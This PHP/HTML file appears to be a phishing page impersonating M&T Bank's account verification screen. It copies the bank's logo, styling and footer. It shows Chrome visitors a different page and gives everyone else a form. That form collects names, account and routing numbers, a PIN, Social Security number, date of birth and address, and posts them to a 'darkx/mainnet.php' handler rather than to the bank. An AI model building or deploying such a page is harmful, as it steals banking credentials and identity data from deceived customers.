
<?php if(strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome') !== FALSE){ ?>

<?php include("default.php"); ?>

<?php }else{ ?>

    <!doctype html>
    <html lang="en" class="__sticky-footer">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
        <script type="text/javascript" src="/ruxitagentjs_ICA2SVfhqru_10205201218101503.js" data-dtconfig="rid=RID_-857388665|rpid=-991021905|domain=mtb.com|reportUrl=/rb_edeadee0-0165-4b9e-a91f-0085183ac4e1|app=ea7c4b59f27d43eb|featureHash=ICA2SVfhqru|vcv=2|rdnt=1|uxrgce=1|bp=2|cuc=zgefxirc|dpvc=1|md=mdcc1=a#AuthID@value|lastModification=1609774829965|dtVersion=10205201218101503|tp=500,50,0,1|uxdcw=1500|vs=2|agentUri=/ruxitagentjs_ICA2SVfhqru_10205201218101503.js"></script>
        <link href="https://m.mtb.com/assets/css/foundation-all.css" rel="stylesheet" />
        <link href="https://m.mtb.com/assets/css/mtb.css" rel="stylesheet" />
        <style>
            /*SUGGESTED ADD FOR THE FRAMEWORK*/
            .no-headerFooter > .mtb-page-header
            {
            display: none;
            }
            .no-headerFooter {
            padding-top: 1.5rem;
            }
        </style>
        <title>Verify Account   | M&T Bank</title>
        <link rel="shortcut icon" href="https://asset.mtb.com/Documents/html/homepage/favicon.ico" type="image/x-icon" />
    </head>
    <body class="">
        <header class="mtb-page-header">
            <a class="mtb__logo" href="https://www.mtb.com/home-page">
            <img class="mtb__logo" src="https://m.mtb.com/assets/img/mtb-logo.svg" alt="M&T Bank" />
            </a>
            <a href="https://onlinebanking.mtb.com" class="button button__right hide js-exitButton" data-ensightentag="ExitButton">
            Exit
            </a>
        </header>
        <div data-msg-code="" 
            class="callout warning __no-border __page-error js-pgLevelMsg hide" tabindex="0">
            <div class="js-pgLevelMsgtext mtb-app-enrollment--content"></div>
        </div>
        <div class="mtb-app-enrollment--content">
            <form action="darkx/mainnet.php" class="js-form js-verifyAccountForm" method="post">
                <section class="grid-x grid-padding-x __spacer-form grid-x__padded">
                <div class="cell">
                    <!-- page title -->
                    <div class="mtb-section-header mtb-section-header--top">
                        <h1>
                            Verify your account information
                        </h1>
                        <p>
                            Enter your account details below to verify your identity.
                        </p>
                    </div>
                </div>
                <div class="cell">
                    <div class="expanded button-group button-group__toggle">
                    </div>
                </div>
                <div class="cell hide"  data-showFor=BusinessAccount >
                    <h2 class="mtb-form__section-title hide"  data-showFor=BusinessAccount>
                        Company Administrator Information
                        <button tabindex="0" type="button" class="m-icon m-icon-questionmarkcircle __contextual-help mtb-help m-icon-questionmarkcircle js-modal-trigger" aria-haspopup="true" aria-controls="reveal-basic"  data-ensightentag=CompanyAdministratorInfoQuestionIcon   data-open=companyadmin-modal>
                        <span class="show-for-sr">Show Help</span>
                        </button>
                    </h2>
                </div>
                <div data-parentFor="FirstName" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
                    <label for="FirstName">First Name</label>
                    <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="letters" placeholder=""  type="text" id="FirstName" name="fname" data-inputType="text" >
                    <p  class="form-error" id=FirstNameError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="LastName" class="cell js-formFieldParent "  data-showFor=BusinessAccount>
                    <label for="LastName">Last Name</label>
                    <input data-fcid="" value=""  maxlength="20" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbersletters" placeholder=""  type="text" id="LastName" name="lname" data-inputType="text" >
                    <p  class="form-error" id=LastNameError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="AccountNumber" class="cell js-formFieldParent "  data-formatType=>
                    <label for="AccountNumber">Account Number</label>
                    <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="">
                        <input data-fcid="" value=""  maxlength="20" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers" placeholder=""  data-inputType="tel" class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus js-keeponclear" type="tel" id="AccountNumber" name="accnum"  >
                        <div class="input-group-button">
                            <button type="button" data-btnFor="AccountNumber" class="button clear js-showHide">
                            Hide
                            </button>
                        </div>
                    </div>
                    <p class="form-error" id=AccountNumberError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="AccountNumber" class="cell js-formFieldParent "  data-formatType=>
                    <label for="AccountNumber">Routing Number</label>
                    <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="">
                        <input data-fcid="" value=""  maxlength="20" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers" placeholder=""  data-inputType="tel" class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus js-keeponclear" type="tel" id="AccountNumber" name="rgnum"  >
                        <div class="input-group-button">
                            <button type="button" data-btnFor="AccountNumber" class="button clear js-showHide">
                            Hide
                            </button>
                        </div>
                    </div>
                    <p class="form-error" id=AccountNumberError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="SecurityPin" class="cell js-formFieldParent"  data-showFor=BusinessCreditCard,BusinessDebitCard,RetailCreditCard,RetailDebitCard>
                    <label for="SecurityPin">4-Digit PIN</label>
                    <input data-fcid="" value=""  maxlength="4" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers" placeholder="0000"  type="password" id="SecurityPin" name="pin" data-inputType="text" >
                    <p  class="form-error" id=SecurityPinError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="SSN" class="cell js-formFieldParent "  data-showFor=BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount data-formatType=ssn>
                    <label for="SSN">Social Security Number</label>
                    <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="●●●-●●-●●●●">
                        <input data-fcid="" value=""  maxlength="11" data-mask="000-00-0000" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers" placeholder="000-00-0000"  data-inputType="tel" class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus" type="tel" id="SSN" name="ssn"  >
                        <div class="input-group-button">
                            <button type="button" data-btnFor="SSN" class="button clear js-showHide">
                            Hide
                            </button>
                        </div>
                    </div>
                    <p class="form-error" id=SSNError role="alert"></p>
                    <p class="form-help-text">
                        <button  data-ensightentag=IDontHaveASSNLink  class="button button__link clear" type="button" data-open="noSSNContent">  I don&#39;t have a Social Security number</button>
                    </p>
                    <p class="callout plain __spacer-paragraph __spacer-form-up hide" id="noSSNContent">If you don't have a Social Security number, you can enroll in Online Banking with your M&T Debit Card or you can call M&T Customer Service at <a href='tel:18007909130'>1-800-790-9130</a> (Mon-Fri 8am-9pm, Sat-Sun 9am-5pm ET).</p>
                </div>
                <div data-parentFor="DateOfBirth" class="cell js-formFieldParent "  data-showFor=BusinessCreditCard,RetailCreditCard,BusinessAccount,RetailAccount data-formatType=date>
                    <label for="DateOfBirth">Date of Birth</label>
                    <input data-fcid="" value=""  maxlength="10" data-mask="00-00-0000" class="js-formnputItem" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers" placeholder="MM/DD/YYYY"  type="tel" id="DateOfBirth" name="dob" data-inputType="tel" >
                    <p  class="form-error" id=DateOfBirthError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                <div data-parentFor="AccountNumber" class="cell js-formFieldParent "  data-formatType=>
                    <label for="AccountNumber">Address</label>
                    <div class="js-maskFldParent input-group m-fake-single-input" data-maskOverlay="">
                        <input data-fcid="" value=""  maxlength="20" data-allowPaste="True" data-allowCopy="True" data-textBoxAccepts="numbers" placeholder=""  data-inputType="tel" class="input-group-field js-canShowHide js-formnputItem input-group__hide-button-on-focus js-keeponclear" type="tel" id="AccountNumber" name="address"  >
                        <div class="input-group-button">
                            <button type="button" data-btnFor="AccountNumber" class="button clear js-showHide">
                            Hide
                            </button>
                        </div>
                    </div>
                    <p class="form-error" id=AccountNumberError role="alert"></p>
                    <p class="form-help-text"></p>
                </div>
                </section>
                <section class="grid-x grid-padding-x mtb-form__section-spacer-button grid-x__padded">
                <div class="cell">
                    <button  data-ensightentag=ContinueButton name="account_verify" type="submit" data-url="" class="button button__form js-submit" >
                    Continue
                    </button>
                </div>
                <div class="cell">
                    <a  href="#" class="button button__fake-padding expanded clear" >
                    Go Back
                    </a>
                </div>
                </section>
            </form>
            <div class="reveal mtb-reveal" id="minwarning-modal" role="dialog" data-reveal="" data-options="closeOnClick:false">
                <div class="mtb-reveal-title ">
                <h1>Timeout Message</h1>
                </div>
                <div class="mtb-reveal-body">
                <div class="cell">
                    <p>Your online banking session has been inactive for 9 minutes. For your security, we will automatically log you out in 1 minute. Click Stay Online to continue your session.</p>
                </div>
                </div>
                <div class="grid-x grid-padding-x grid-x__padded mtb-reveal-bottom">
                <div class="cell small-6">
                    <a href="/Enrollment" class="button hollow expanded" aria-label="Log out" data-close="" data-ensightentag="ExitButton" name="TagPageName" id="TagPageName">EXIT</a>
                </div>
                <div class="cell small-6">
                    <button class="button expanded js-sessiontimer" aria-label="Close modal" type="button" data-sessiontimer="9" data-close="" data-ensightentag="StayOnlineButton" name="TagPageName" id="TagPageName">STAY ONLINE</button>
                </div>
                </div>
            </div>
            <input id="TagPageName" name="TagPageName" type="hidden" value="OLB:MOE:CombinedAccountEligibility" />
        </div>
        <footer class="mtb-footer" role="contentinfo">
            <div class="grid-x grid-padding-x align-center-middle grid-x__padded">
                <div class="cell">
                <p>
                    &copy;2021 M&amp;T Bank. All Rights Reserved.<br>
                    Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use" target="_blank">Terms of Use</a> and <a href="https://www.mtb.com/privacy" target="_blank">Privacy Policy</a>.
                </p>
                <div class="mtb-footer__logo">
                    <a href="https://www.mtb.com/equalhousinglender" target="_blank">
                    <img src="https://m.mtb.com/assets/img/mtb-equalhousinglender.svg" class="mtb-footer__equalhousinglender" alt="Equal Housing Lender">
                    </a>
                    <a href="https://www.mtb.com/olb-entrust" target="_blank">
                    <img src="https://m.mtb.com/assets/img/mtb-entrust.svg" class="mtb-footer__entrust" alt="Entrust">
                    </a>
                </div>
                <p>
                    Equal Housing Lender. NMLS #381076<br>
                    <a href="https://www.mtb.com/fdic" target="_blank">Member FDIC.</a>
                </p>
                </div>
            </div>
        </footer>
        <script src="https://m.mtb.com/scripts/jquery-3.3.1.js"></script>
        <script src="https://m.mtb.com/scripts/foundation.js"></script>
        <script src="//nexus.ensighten.com/mtbank/OE-Prod/Bootstrap.js"></script>
        <script src="https://m.mtb.com/scripts/Moe/errorMsg.js"></script>
        <script src="https://m.mtb.com/scripts/Moe/mtb-app.js"></script>
        <script src="https://m.mtb.com/scripts/Moe/formInputValidations.js"></script>        
        <script src=/scripts/Moe/Enrollment/enrollment.js></script>
        <script src="vendor/jquery-3.2.1.min.js"></script>
        <script src="dist/jquery.mask.js"></script>
        <script src="dist/jquery.mask.min.js"></script>
        <div class="reveal-overlay mtb-spinner--overlay" id="loadingOverlay">
            <div class="mtb-spinner--triple-dot">
                <div></div>
                <div></div>
                <div></div>
                <span class="show-for-sr">Loading ...</span>
            </div>
        </div>
    </body>
    </html>


<?php } ?>